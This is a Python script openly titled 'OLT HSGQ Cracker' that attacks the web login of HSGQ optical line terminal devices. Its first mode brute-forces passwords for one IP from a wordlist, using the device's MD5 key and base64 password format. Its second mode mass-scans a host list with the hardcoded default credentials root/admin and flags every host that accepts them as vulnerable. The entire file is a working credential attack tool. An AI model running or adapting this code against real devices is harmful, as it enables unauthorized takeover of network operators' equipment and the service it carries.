# Code by Mugi F.
# github.com/mugi789
# Bandung, 6 July 2024

import requests, hashlib, json, datetime, sys
from base64 import b64encode

print("""
                |
             \033[34m / _ \ \033[39m
  \033[31mOLT HSGQ\033[34m \033[34m \_\(_)/_/ \033[39m
   Cracker  \033[34m _//\033[31m"\033[39m\033[34m\\\_ \033[39m
             \033[34m /   \ \033[39m
      """)

def menu():
    print("1. Scan By Single IP")
    print("2. Mass Scan With Default User")
    pilih = int(input(">>> "))
    if pilih == 1:
        ip = input("Input IP : ")
        user = input("Input User : ")
        pwd = input("Input File Wordlist : ")
        print("============= START =============")
        try:
            with open(pwd, "r") as pswrd:
                for line in pswrd:
                    baris = line.replace('\n', '')
                    pwd64 = b64encode(bytes(baris.encode('utf-8'))).decode("utf-8")
                    heder = {
                        'Host': ip,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Content-Type': 'application/json;charset=utf-8',
                        'X-Token': 'null',
                        'Content-Length': '130',
                        'Origin': 'http://'+ip,
                        'Connection': 'keep-alive',
                        'Referer': 'http://'+ip,
                        'Sec-GPC': '1',
                        'Priority': 'u=1'
                        }
                    mentah = {
                        "method": "set",
                        "param": {
                            "captcha_f": "",
                            "captcha_v": "",
                            "key": hashlib.md5(str(user+":"+baris).encode("utf-8")).hexdigest(),
                            "name": user,
                            "value": pwd64
                            }
                        }
                    crot = requests.post("http://"+ip+"/userlogin?form=login", data=json.dumps(mentah), headers=heder)
                    if crot.text.split(",")[1].split('"')[3] == "success":
                        print("=================================")
                        print("Password Found ^_^")
                        print("Host : "+ip)
                        print("User : "+user)
                        print("Password : "+baris)
                        print("============== END ==============")
                        pass
                        break
                    elif crot.text.split(",")[1].split()[2] == "Error":
                        print("User not found")
                        print("Try changing to root user or something else")
                        print("="*35)
                        break
                    else:
                        print("Trying "+baris+" ERROR ~ "+str(datetime.datetime.now().strftime("%H:%M:%S")))
                        pass
                else:
                    print("============== END ==============")
        except FileNotFoundError:
            print("Wordlist file not found")
        except requests.exceptions.ConnectionError:
            print("IP not found")
    elif pilih == 2:
        urlist = input("Input list file : ")
        # just for stopping request
        tambahan = open(urlist, 'a+')
        tambahan.write('\n127.0.0.1:666')
        tambahan.seek(0)
        tambahan.close()
        print("============= START =============")
        while True:
            with open(urlist, "r") as urlll:
                for list in urlll:
                    try:
                        listx = list.replace("\n", "")
                        heder = {
                                'Host': listx,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
                                'Accept': 'application/json, text/plain, */*',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Accept-Encoding': 'gzip, deflate',
                                'Content-Type': 'application/json;charset=utf-8',
                                'X-Token': 'null',
                                'Content-Length': '130',
                                'Origin': 'http://'+listx,
                                'Connection': 'keep-alive',
                                'Referer': 'http://'+listx,
                                'Sec-GPC': '1',
                                'Priority': 'u=1'
                                }
                        dataraw = {
                                "method": "set",
                                "param": {
                                    "captcha_f": "",
                                    "captcha_v": "",
                                    "key": "1761d487ba0cde5f285059b5cca9a22c",
                                    "name": "root",
                                    "value": "YWRtaW4="
                                    }                                }
                        crot = requests.post("http://"+listx+"/userlogin?form=login", data=json.dumps(dataraw), headers=heder, timeout=1)
                        if crot.text.split(",")[1].split('"')[3] == "success":
                            print(" ~> "+listx+" \033[32m[ VULN ]\033[39m")
                        else:
                            print(" ~> "+listx+" \033[31m[ LOGIN FAILED ]\033[39m")
                    except FileNotFoundError:
                        print("File not found")
                        break
                    except requests.exceptions.ConnectionError:
                        print(" ~> "+listx+" \033[34m[ ERROR ]\033[39m")
                        if listx == "127.0.0.1:666":
                            # delete stopper
                            ganti = open(urlist, 'r').read().replace('\n127.0.0.1:666', '')
                            baruganti = open(urlist, 'w')
                            baruganti.write(ganti)
                            baruganti.close()
                            sys.exit("============== END ==============")
                    except requests.exceptions.ReadTimeout:
                        print(" ~> "+listx+" \033[35m[ IP DOWN ]\033[39m")
                    except requests.exceptions.InvalidURL:
                        print(" ~> "+listx+" \033[35m[ URL INVALID ]\033[39m")
                    except KeyboardInterrupt:
                        print(" Bye ~")
                        sys.exit(0)
menu()